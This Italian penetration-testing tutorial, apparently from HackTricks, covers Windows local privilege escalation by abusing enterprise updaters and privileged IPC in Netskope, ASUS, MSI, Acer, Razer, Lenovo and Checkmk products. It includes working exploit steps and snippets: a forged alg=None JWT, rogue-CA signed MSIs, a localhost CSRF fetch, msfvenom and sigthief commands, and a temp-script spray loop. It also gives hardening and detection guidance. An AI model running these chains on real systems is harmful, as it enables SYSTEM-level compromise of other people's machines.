# Abuso degli auto-updater enterprise e dell’IPC privilegiato (es. Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una categoria di catene di privilege escalation locale su Windows individuate in agent e updater enterprise per endpoint, che espongono una superficie IPC facilmente accessibile e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client per Windows < R129 (CVE-2025-0309), in cui un utente con privilegi limitati può forzare la registrazione verso un server controllato dall’attaccante e poi inviare un MSI malevolo che il servizio installa come SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell’IPC localhost di un servizio privilegiato per forzare una nuova registrazione o riconfigurazione verso un server dell’attaccante.
- Implementare gli endpoint di aggiornamento del vendor, fornire una Trusted Root CA non autorizzata e indirizzare l’updater verso un pacchetto malevolo “firmato”.
- Eludere controlli deboli del firmatario (allow-list basate sul CN), flag di digest opzionali e proprietà MSI permissive.
- Se l’IPC è “cifrato”, derivare la chiave/IV da identificatori della macchina leggibili da tutti e memorizzati nel registro.
- Se il servizio limita i chiamanti in base al percorso dell’immagine o al nome del processo, effettuare injection in un processo consentito oppure avviarne uno in stato suspended e inizializzare la DLL con una modifica minima del contesto del thread.

Anche i servizi TCP locali personalizzati richiedono lo stesso esame dell’identità e dei confini di input, anche quando richiedono un PIN o altre credenziali applicative. Associa il listener al relativo processo e all’account del servizio effettivo, quindi controlla il binario/la versione effettivamente distribuiti e verifica se i campi controllati dal chiamante vengono sottoposti a un controllo di lunghezza prima di essere copiati in buffer a dimensione fissa o usati per costruire il comando di un processo figlio. Le [indicazioni di Microsoft sui buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) spiegano perché gli input esterni non controllati sono pericolosi nel codice nativo privilegiato. Un listener loopback, una credenziale hardcoded o il solo nome di un processo non dimostrano la presenza di corruzione della memoria o di esecuzione come SYSTEM; raggiungibilità, autorizzazione, percorso del codice e mitigazioni restano condizioni distinte. Mantieni passiva l’enumerazione di routine, senza inviare a un servizio attivo input di lunghezza tale da causarne il crash.

---
## 1) Forzare la registrazione verso un server dell’attaccante tramite IPC localhost

Molti agent includono un processo UI in modalità user che comunica con un servizio SYSTEM tramite TCP localhost usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Servizio: stAgentSvc (SYSTEM)
- ID comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell’exploit:
1) Crea un token di registrazione JWT le cui claim controllano l’host del backend (ad es., AddonUrl). Usa alg=None, così non è necessaria alcuna firma.
2) Invia il messaggio IPC che invoca il comando di provisioning con il tuo JWT e il nome del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Il servizio inizia a contattare il tuo server malevolo per l’enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del chiamante si basa sul percorso/nome, origina la richiesta da un binario del vendor inserito nella allowlist (vedi §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC di gestione esposto in rete

Questo confine di fiducia non è sempre limitato a localhost. Nel caso segnalato di MyReport Updater 2.1.1, un servizio `LocalSystem` era in ascolto su tutte le interfacce e accettava una modifica non autenticata della configurazione gRPC per l’host di riferimento, la porta e la modalità operativa. Per la variante remota erano necessari sia l’accesso di rete al listener sia l’accesso in uscita dal servizio al riferimento scelto. Valuta questi aspetti separatamente dalla possibilità che il successivo flusso del pacchetto superi il confine di scrittura dei file.<sup>[[16]](#references)</sup>

---
## 2) Dirottare il canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo verso un MSI controllato dall’attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo di aggiornamento molto breve, ad es.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nell'archivio Trusted Root del computer locale.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione falsa.

Come aggirare i controlli comuni riscontrati sul campo:
- Allow-list del CN del signer: il servizio potrebbe controllare solo che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un certificato leaf con quel CN e firmare l'MSI.
- Proprietà CERT_DIGEST: includi una proprietà MSI innocua chiamata CERT_DIGEST. Non viene verificata durante l'installazione.
- Verifica opzionale del digest: un flag di configurazione (ad es., check_msi_digest=false) disabilita la convalida crittografica aggiuntiva.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lezione sull'aggiramento delle patch: se un vendor risponde inserendo in allow-list un piccolo insieme di domini “attendibili” invece di autenticare crittograficamente la fonte dell'aggiornamento, cerca redirector o reverse proxy di proprietà del vendor che consentano comunque di reindirizzare il traffico. Nel caso di Netskope, le ricerche pubbliche successive hanno mostrato che una allow-list dell'era R129 poteva ancora essere aggirata tramite `rproxy.goskope.com`, che faceva da proxy a contenuti Azure App Service controllati dall'attaccante. Considera le allow-list dei nomi host un ostacolo, non un confine di sicurezza.<sup>[[14]](#references)</sup>

Un'altra modalità di errore consiste in **metadati del pacchetto coerenti ma non autenticati**. Nel caso MyReport, un riferimento controllato dall'attaccante forniva un archivio modificato, mentre un intermediario modificava le risposte del vendor contenenti digest MD5 e dimensioni prima che raggiungessero l'updater. La corrispondenza di quei valori verificava la coerenza delle risposte, non la provenienza dal vendor; non era necessario alcun collisione MD5. Una directory di installazione scelta dal chiamante trasformava poi l'estrazione privilegiata in un confine di scrittura file. La primitiva di caricamento DLL risultante è trattata in [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Forgiare richieste IPC crittografate (quando presenti)

Dalla versione R127, Netskope ha racchiuso il JSON IPC in un campo encryptData dall'aspetto simile a Base64. Il reverse engineering ha rivelato l'uso di AES, con chiave e IV derivati da valori del registro leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attaccanti possono riprodurre la crittografia e inviare comandi crittografati validi da un utente standard.<sup>[[1]](#references)[[2]](#references)</sup> Suggerimento generale: se un agent inizia improvvisamente a “crittografare” il proprio IPC, cerca nel registro HKLM ID dispositivo, GUID di prodotto e ID di installazione da usare come materiale.

---
## 4) Aggirare le allow-list dei chiamanti IPC (controlli di percorso/nome)

Alcuni servizi tentano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il percorso/nome dell'immagine con quelli dei binari del vendor inseriti in allow-list e situati in Program Files (ad es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due metodi pratici per aggirarli:
- DLL injection in un processo inserito in allow-list (ad es., nsdiag.exe) e inoltro dell'IPC dall'interno del processo.
- Avvio di un binario inserito in allow-list in stato sospeso e bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per rispettare le regole anti-manomissione applicate dal driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatibile con la protezione anti-manomissione: processo sospeso + patch NtContinue

I prodotti spesso includono un driver minifilter/OB callbacks (ad es., Stadrv) per rimuovere i diritti pericolosi dagli handle ai processi protetti:
- Processo: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita i diritti a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader affidabile in user mode che rispetta questi vincoli:
1) Crea un processo con CreateProcess usando un binario del vendor e CREATE_SUSPENDED.
2) Ottieni gli handle che ti sono ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo e un handle al thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME se applichi la patch al codice a un RIP noto).
3) Sovrascrivi ntdll!NtContinue (o un altro thunk iniziale mappato con certezza) con uno stub minimale che chiama LoadLibraryW sul percorso della tua DLL, quindi salta indietro.
4) Esegui ResumeThread per attivare lo stub nel processo e caricare la tua DLL.

Poiché non hai usato PROCESS_CREATE_THREAD né PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver viene rispettata.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Strumenti pratici
- NachoVPN (plugin Netskope) automatizza la creazione di una rogue CA, la firma di un MSI malevolo e l'esposizione degli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope è un client IPC personalizzato che crea messaggi IPC arbitrari (eventualmente crittografati con AES) e include l'injection di un processo sospeso per inviare le richieste da un binario inserito in allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rapido di triage per superfici updater/IPC sconosciute

Quando analizzi un nuovo endpoint agent o una suite di “helper” per motherboard, un workflow rapido è di solito sufficiente per capire se hai davanti un potenziale target di privesc:<sup>[[6]](#references)</sup>

1) Elenca i listener loopback e risali ai processi del vendor corrispondenti:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumerare le named pipe candidate:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Estrai i dati di routing archiviati nel registro, utilizzati dai server IPC basati su plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Estrai prima dal client in user-mode i nomi degli endpoint, le chiavi JSON e gli ID dei comandi. I frontend Electron/.NET impacchettati spesso fanno leak dello schema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Individua il predicato di fiducia effettivo, non solo il percorso del codice che alla fine avvia il processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Pattern a cui dare priorità:
- `CryptQueryObject`/parsing dei certificati senza `WinVerifyTrust` di solito significa che “il certificato esiste” è stato considerato equivalente a “il certificato è attendibile”, consentendo il cloning dei certificati o altri trucchi con fake signer.
- I controlli su sottostringhe/suffissi di `Origin`, `Referer`, URL di download, nomi di processi o CN dei signer non sono autenticazione. `contains(".vendor.com")` è solitamente sfruttabile tramite domini simili controllati dall’attaccante.
- Se la GUI con privilegi inferiori decide che “il file è attendibile” e il broker SYSTEM si limita a usare quel risultato, modificare o reimplementare la DLL/JS lato client spesso aggira completamente il confine (validazione separata in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo valida o lo pianifica da quel percorso, verifica subito la presenza di finestre di sostituzione TOCTOU e di moduli plugin adiacenti che espongono wrapper alternativi `ExecuteTask()` con controlli più deboli.<sup>[[6]](#references)</sup>

Per i target che fanno ampio uso di named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili da remoto prima di iniziare ad analizzare a fondo il protocollo.<sup>[[11]](#references)</sup>

Se il target autentica i chiamanti solo tramite PID, percorso dell’immagine o nome del processo, considera questi controlli un ostacolo minore, non un confine: spesso è sufficiente iniettarsi nel client legittimo o effettuare la connessione da un processo allow-listed per soddisfare i controlli del server. Per le named pipe in particolare, [questa pagina sull’impersonazione del client e l’abuso delle pipe](named-pipe-client-impersonation.md) approfondisce la primitiva.

Per un **broker di cleanup o restore** privilegiato, esamina il confine di attendibilità dei percorsi oltre all’ACL della pipe. Un chiamante con privilegi inferiori potrebbe riuscire a selezionare una destinazione di restore o a rinominare un backup temporaneo in una directory condivisa, anche se l’eseguibile del servizio e la sua directory di installazione sono protetti. Verifica separatamente che il chiamante possa raggiungere il comando di restore, modificare l’input temporaneo esatto o il nome del file, che il broker venga eseguito con un’identità superiore e che l’operazione di restore scriva effettivamente nel percorso protetto selezionato. Una directory temporanea scrivibile o una pipe leggibile, da sole, non dimostrano la possibilità di effettuare una scrittura arbitraria con privilegi elevati; la mappatura della destinazione e il comportamento del servizio richiedono una code review o test controllati. Non eseguire comandi di cleanup sconosciuti durante l’enumerazione passiva, perché potrebbero eliminare file dell’utente.

---
## 8) Broker di add-in modulari autenticati solo tramite firme del vendor (pattern Lenovo Vantage)

Una variante più recente da cercare è il **broker RPC con client firmato**: un processo desktop Lenovo-signed con privilegi inferiori comunica con un servizio SYSTEM, che instrada comandi JSON verso una serie di add-in descritti da XML in `%ProgramData%`. Una volta ottenuta l’esecuzione di codice **all’interno di un client firmato accettato**, ogni contratto `runas="system"` diventa parte della superficie di attacco.<sup>[[15]](#references)</sup>

Primitive di alto valore osservate nella ricerca su Lenovo Vantage:
- **Fidarsi del chiamante perché è firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE Lenovo-signed in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`), così da eseguire codice arbitrario all’interno di un client già considerato attendibile dal servizio.
- **Scoperta della superficie di attacco basata sui manifest**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti vengono eseguiti come `SYSTEM`, quindi enumerare questi manifest spesso rivela le reali operazioni privilegiate più rapidamente che analizzare il broker stesso.
- **Bug per singolo comando dietro il canale autenticato**: una volta all’interno del client attendibile, la ricerca pubblica ha individuato path traversal e race condition nei comandi di update/installazione, abuso di SQL grezzo nei database delle impostazioni privilegiate e controlli dei percorsi del registro basati su sottostringhe che consentivano scritture al di fuori dell’hive previsto.

Ricognizione utile su un target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Indicazione pratica: ogni volta che una suite di helper espone un broker che autentica prima il **processo chiamante** e solo dopo inoltra le richieste a decine di comandi di plugin/add-in, non fermarti dopo aver aggirato il controllo di fiducia iniziale. Estrai la tabella manifest/contract e fai fuzzing su ogni verbo con privilegi elevati, singolarmente: il canale autenticato nasconde spesso diversi bug di secondo livello.

---
## 1) CSRF dal browser a localhost contro API HTTP con privilegi (ASUS DriverHub)

DriverHub include un servizio HTTP in user-mode (ADU.exe) su 127.0.0.1:53000, che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell’origine esegue semplicemente `string_contains(".asus.com")` sull’header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall’attaccante, come `https://driverhub.asus.com.attacker.tld`, supera quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript.<sup>[[6]](#references)</sup> Vedi [nozioni di base sulla CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) per altri schemi di bypass.

Flusso pratico:
1) Registra un dominio che includa `.asus.com` e ospitaci una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint con privilegi (ad esempio, `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Invia il corpo JSON previsto dall’handler: il JS frontend compresso mostra lo schema qui sotto.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Anche la CLI di PowerShell mostrata di seguito ha esito positivo quando l'header Origin viene falsificato impostandolo sul valore attendibile:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualsiasi visita del browser al sito dell’attaccante diventa quindi un CSRF locale con 1 clic (o 0 clic tramite `onload`) che attiva un helper con privilegi SYSTEM.

---
## 2) Verifica insicura della firma del codice e clonazione del certificato (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li memorizza nella cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La convalida degli URL di download riutilizza la stessa logica basata su sottostringhe, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe si limita a verificare che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS prima di eseguirlo: nessun `WinVerifyTrust`, nessuna convalida della catena.

Per rendere sfruttabile il flusso:
1) Crea un payload (ad es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona il firmatario ASUS nel payload (ad es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite il CSRF del browser descritto sopra.

Poiché sia i filtri Origin che quelli degli URL si basano su sottostringhe e il controllo del firmatario confronta soltanto stringhe, DriverHub scarica ed esegue il binario dell’attaccante nel proprio contesto privilegiato.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nei percorsi di copia/esecuzione dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è composto da `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente principale (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il relativo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere esito positivo).
3) Crea un’attività pianificata che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare il Frame A indicando un binario MSI firmato legittimo (così il controllo della firma viene superato e l’attività viene accodata).
- Sfruttarlo con messaggi Frame B ripetuti che puntano a un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando l’utilità di pianificazione si attiva, esegue il payload sovrascritto come SYSTEM, nonostante sia stato convalidato il file originale. Per uno sfruttamento affidabile si usano due goroutine/thread che inviano ripetutamente CMD_AutoUpdateSDK finché non si vince la finestra TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso di IPC personalizzati a livello SYSTEM e impersonificazione (MSI Center + Acer Control Centre)

### Set di comandi TCP di MSI Center
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attaccanti di instradare i comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` **senza convalidare la firma**: qualsiasi utente locale può indicargli `C:\Users\<user>\Desktop\payload.exe` e ottenere l’esecuzione come SYSTEM in modo deterministico.
- Analizzare il traffico loopback con Wireshark o strumentare i binari .NET con dnSpy consente di individuare rapidamente la corrispondenza tra Component e comando; si possono quindi riprodurre i frame con client personalizzati in Go/Python.<sup>[[6]](#references)</sup>

### Named pipe di Acer Control Centre e livelli di impersonificazione
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode` e la relativa ACL discrezionale consente l’accesso a client remoti (ad es., `\\TARGET\pipe\treadstone_service_LightMode`). L’invio del command ID `7` con un percorso di file richiama la routine del servizio che avvia i processi.
- La libreria client serializza un byte terminatore speciale (113) insieme agli argomenti. L’instrumentazione dinamica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sull’instrumentazione) mostra che l’handler nativo associa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un SID di integrità prima di chiamare `CreateProcessAsUser`.
- Sostituendo 113 (`0x71`) con 114 (`0x72`), si entra nel ramo generico che mantiene il token SYSTEM completo e imposta un SID di integrità elevata (`S-1-16-12288`). Il binario avviato viene quindi eseguito come SYSTEM senza restrizioni, sia localmente sia tra macchine.
- Abbina il tutto al flag dell’installer esposto (`Setup.exe -nocheck`) per installare ACC anche su VM di laboratorio e provare la pipe senza hardware del vendor.<sup>[[6]](#references)</sup>

Questi bug IPC mostrano perché i servizi localhost devono imporre l’autenticazione reciproca (SID ALPC, filtri `ImpersonationLevel=Impersonation`, filtro dei token) e perché l’helper di ogni modulo per “eseguire binari arbitrari” deve adottare le stesse verifiche del firmatario.

---
## 3) Helper COM/IPC “elevator” basati su una convalida debole in user mode (Razer Synapse 4)

Razer Synapse 4 ha introdotto un altro schema utile in questa famiglia: un utente con privilegi limitati può chiedere a un helper COM di avviare un processo tramite `RzUtility.Elevator`, mentre la decisione di attendibilità è delegata a una DLL in user mode (`simple_service.dll`) anziché essere applicata in modo robusto all’interno del perimetro privilegiato.

Percorso di sfruttamento osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere un avvio elevato.
- Nel PoC pubblico, il controllo della firma PE all’interno di `simple_service.dll` viene disattivato con una patch prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attaccante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocazione PowerShell minimale:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusione generale: quando analizzi in reverse le suite di “helper”, non fermarti a TCP localhost o alle named pipe. Controlla la presenza di classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, poi verifica se il servizio privilegiato convalida effettivamente il binario di destinazione oppure si limita a fidarsi di un risultato calcolato da una DLL client patchabile in user mode. Questo schema non è specifico di Razer: qualsiasi architettura separata in cui il broker con privilegi elevati si affida a una decisione di autorizzazione o rifiuto proveniente dal lato con privilegi ridotti è una potenziale superficie di privesc.


---
## Esecuzione prevedibile di script temporanei durante la riparazione MSI (Checkmk Agent / CVE-2024-0670)

Alcuni agent Windows eseguono ancora azioni privilegiate scrivendo un file `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il nome del file è prevedibile e il servizio non ricrea in modo sicuro i file già esistenti, un utente con privilegi ridotti può creare in anticipo il futuro file temporaneo in modalità **sola lettura** e indurre il processo privilegiato a eseguire contenuto controllato dall’attaccante invece del proprio script.

Rilevato nelle build vulnerabili di Checkmk Agent:
- schema del file temporaneo: `cmk_all_<PID>_1.cmd`
- rami interessati: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **riparazione** MSI del pacchetto dell’agent nella cache<sup>[[8]](#references)[[9]](#references)</sup>

Procedura pratica:
1. Stima un intervallo realistico di PID a partire dagli ID dei processi attuali o dal PID dell’agent in esecuzione.
2. Scrivi un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` o redirezione di `cmd.exe`; evita l’output PowerShell in UTF-16 per i file batch).
3. Fai spray di `C:\Windows\Temp\cmk_all_<PID>_1.cmd` nell’intervallo candidato e imposta ogni file come sola lettura.
4. Avvia una riparazione dell’MSI nella cache, in modo che il servizio privilegiato tenti di rigenerare ed eseguire lo script temporaneo.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se il prodotto vulnerabile è installato con Windows Installer, individua il nome del prodotto corrispondente al file MSI memorizzato nella cache con un nome apparentemente casuale in `C:\Windows\Installer` prima di avviare la riparazione:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Note operative:
- `qwinsta` è utile quando `msiexec /fa` non riesce da una shell WinRM non interattiva e occorre capire se una sessione desktop esistente o disconnessa può attivare correttamente la riparazione.<sup>[[7]](#references)</sup>
- Questo schema si applica anche ad altri agent e updater endpoint che **preparano script temporanei in percorsi scrivibili da chiunque e in seguito li eseguono come SYSTEM**. Verifica la presenza di nomi prevedibili, l'assenza di semantiche di creazione esclusiva e la possibilità di attivare su richiesta i flussi di riparazione/aggiornamento.

### Riparazione interattiva dell'installer e console con privilegi elevati

PDF24 Creator 11.15.1 illustra un rischio distinto legato alla riparazione MSI: durante la riparazione, la sua custom action di installazione della stampante può avviare una console visibile con privilegi SYSTEM. Il vendor ha modificato l'installer MSI nella versione 11.15.2 per correggere questo comportamento. Una versione precedente del prodotto è solo un indizio iniziale per il triage. Controlla il pacchetto MSI registrato o accessibile, se l'utente può avviare la riparazione, se sono presenti la custom action vulnerabile e il ritardo del file di log, e se un desktop interattivo può rendere visibile la console. Il ritardo segnalato sfruttava un oplock su `faxPrnInst.log`; la normale scrittura sul file non è l'unica condizione di accesso. Una shell non interattiva, un pacchetto inaccessibile o un installer corretto possono interrompere la catena. Questo problema non dipende da `AlwaysInstallElevated` ed è diverso dalla sostituzione di uno script temporaneo prevedibile.

---
## Hijacking della supply chain remota tramite validazione debole dell'updater (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, gli aggressori che avevano compromesso l'infrastruttura di hosting alla base del flusso di aggiornamento di Notepad++ hanno fornito selettivamente manifest malevoli a vittime selezionate. Gli updater più vecchi basati su WinGUp non verificavano completamente l'autenticità degli aggiornamenti, quindi una risposta XML ostile poteva reindirizzare i client a URL controllati dagli aggressori. Poiché il client accettava contenuti HTTPS senza verificare sia una catena di certificati attendibile sia una firma PE valida sull'installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.<sup>[[12]](#references)[[13]](#references)</sup>

Flusso operativo (non è necessario alcun exploit locale):
1. **Intercettazione dell'infrastruttura**: compromettere CDN/hosting e rispondere ai controlli degli aggiornamenti con metadati controllati dagli aggressori che puntano a un URL di download malevolo.
2. **NSIS trojanizzato**: l'installer scarica/esegue un payload e sfrutta due catene di esecuzione:
   - **Bring-your-own signed binary + sideload**: includere il file firmato da Bitdefender `BluetoothService.exe` e inserire un `log.dll` malevolo nel suo percorso di ricerca. Quando viene eseguito il binario firmato, Windows carica tramite sideload `log.dll`, che decripta e carica in modo riflessivo la backdoor Chrysalis (protetta da Warbird + hashing delle API per ostacolare il rilevamento statico).
   - **Iniezione di shellcode tramite script**: NSIS esegue uno script Lua compilato che usa API Win32 (ad es. `EnumWindowStationsW`) per iniettare shellcode e predisporre Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Indicazioni per hardening e rilevamento applicabili a qualsiasi updater:
- Verifica **certificato + firma dell'installer scaricato** (fissa il signer del vendor, rifiuta CN/catena non corrispondenti) e firma il manifest di aggiornamento stesso (ad es. XMLDSig). Blocca i reindirizzamenti controllati dal manifest se non sono convalidati.
- Considera il **sideloading di binari firmati BYO** come un punto di rilevamento successivo al download: genera un alert quando un EXE firmato del vendor carica una DLL da un percorso esterno a quello canonico d'installazione (ad es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater inserisce o esegue installer da directory temporanee con firme non appartenenti al vendor.
- Monitora gli **artefatti specifici del malware** osservati in questa catena (utili come indicatori generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%` e fasi di iniezione di shellcode avviate da Lua.
- Notepad++ ha risposto rafforzando WinGUp dalla versione v8.8.9 in poi: l'XML restituito ora è firmato (XMLDSig) e le build più recenti verificano certificato + firma dell'installer scaricato, invece di fidarsi solo del trasporto.<sup>[[13]](#references)</sup>

<details>
<summary>XQL di Cortex XDR – sideloading di <code>log.dll</code> tramite EXE firmato da Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
